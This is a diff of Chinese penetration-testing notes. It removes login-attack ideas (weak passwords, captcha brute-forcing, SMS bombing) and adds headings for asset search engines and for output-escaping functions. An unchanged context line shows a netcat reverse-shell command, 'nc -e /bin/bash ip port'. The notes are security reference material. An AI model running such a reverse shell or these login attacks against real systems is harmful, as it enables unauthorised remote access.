@@ -48,18 +48,6 @@
 - 利用方法
 - 遇到问题
 
-# 思路
-
-挖洞的目的：证明目标服务器不安全：权限、数据、破坏。除了传统漏洞外，也要从这三个角度思考有没有利用点
-
-1. 筛选出比较常见通用的、危害比较高影响比较大的漏洞点
-2. 以漏洞利用结果相同或相似为条件进行分类
-3. 头脑风暴， 将所有可能实现目标的攻击途径列举出来，不断在实战中进行尝试利用
-
-常见功能的思路
-
-- 登录：弱口令；验证码可爆破/复用；短信轰炸
-
 # 认证
 
 ## 相关名词
@@ -143,7 +131,11 @@ localStorage与sessionStorage
 
 # 搜索引擎
 
-待补充
+## Fofa
+
+## 鹰图
+
+## Quake
 
 # 其他
 
@@ -232,3 +224,8 @@ nc -e /bin/bash ip port           # 需要目标安装了nc
 
 Firefox：打开about:config，将`security.tls.version.min`改成1
 
+## 转义
+
+URI、HTML、SQL
+
+php: `htmlspecialchars`；mysqli：`mysqli_real_escape_string`
